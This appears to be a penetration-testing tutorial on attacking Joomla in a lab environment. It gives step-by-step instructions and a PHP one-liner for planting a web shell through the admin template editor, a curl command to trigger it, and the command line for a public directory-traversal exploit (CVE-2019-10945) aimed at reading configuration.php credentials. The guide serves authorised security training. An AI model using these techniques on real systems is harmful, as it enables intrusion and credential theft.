# Attacking Joomla

With admin credentials confirmed, two main attack paths are available: abusing built-in template editing to achieve code execution, and leveraging known core vulnerabilities where the admin portal may not be directly reachable. The template editor approach is the fastest and most reliable route when you have admin access.

***

## RCE via Template Editor

Joomla's admin panel allows direct editing of PHP template files, which you can weaponise to plant a web shell. Navigate to the admin panel at `/administrator/index.php` and follow these steps:

1. Click Templates in the left panel under Configuration
2. Select a template from the list, for example `protostar`, by clicking its name under the Template column
3. Select a low-traffic file to modify, such as `error.php`
4. Add the following PHP one-liner below the existing comments:

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

5. Click Save & Close

The shell is now reachable at the template's path. Trigger it with cURL:

```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Using a hashed or non-obvious GET parameter name rather than `cmd` or `c` reduces the chance of a third party discovering and abusing the shell during the assessment window. After confirming execution, upgrade to a full reverse shell for post-exploitation. Once done, remove the PHP snippet from `error.php` and document the modification in the report appendices.

> If you encounter the error `Call to a member function format() on null` after logging in, navigate to `/administrator/index.php?option=com_plugins` and disable the `Quick Icon - PHP Version Check` plugin. This allows the control panel to render properly.

***

## Web Shell Parameter Naming

Good habits for web shell parameters during assessments:

- Use a random or hashed string as the parameter name, not `cmd`, `exec`, or `c`
- Optionally add IP-based access restrictions at the server level if the environment allows
- Always remove the shell immediately after use
- Log the full file path, file hash, and parameter name in the report appendix regardless of whether cleanup was successful

***

## Leveraging Known Vulnerabilities

Joomla has accumulated over [426 CVEs](https://www.cvedetails.com/product/6129/Joomla-Joomla.html?vendor_id=3496) across its history. The majority of high-severity exploits target extensions rather than Joomla core, and not every CVE has a working public proof-of-concept. Searching [Exploit-DB](https://www.exploit-db.com/) for Joomla returns over 1,400 entries, with most targeting third-party components.

### CVE-2019-10945: Directory Traversal and Arbitrary File Deletion

Joomla versions 1.5.0 through 3.9.4 are affected by [CVE-2019-10945](https://nvd.nist.gov/vuln/detail/CVE-2019-10945). The vulnerability exists in the Media Manager component, which fails to sanitise the `folder` parameter, allowing an authenticated attacker to traverse directories outside the media manager root and access or delete arbitrary files on the server.

The Python 3 version of the exploit is available at [github.com/dpgg101/CVE-2019-10945](https://github.com/dpgg101/CVE-2019-10945) and the original Python 2 script on [Exploit-DB](https://www.exploit-db.com/exploits/46710).

Run the script with the `--url`, `--username`, `--password`, and `--dir` flags:

```bash
python3 CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

Example output listing the webroot:

```
administrator
bin
cache
components
images
includes
libraries
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
index.php
robots.txt
```

The `configuration.php` file is the most valuable target here, as it contains the Joomla database credentials. Use the directory traversal to locate it and then access it through the application URL if the webserver user has read access.

The file deletion capability this vulnerability also exposes carries real risk. Only use it if explicitly scoped and authorised, and never delete files during a standard assessment. Document any directory traversal activity in the report.

> This CVE is most useful when you have valid credentials but the admin portal is restricted from your source IP. If the admin panel is accessible and you already have credentials, the template editor method above is faster and more reliable.
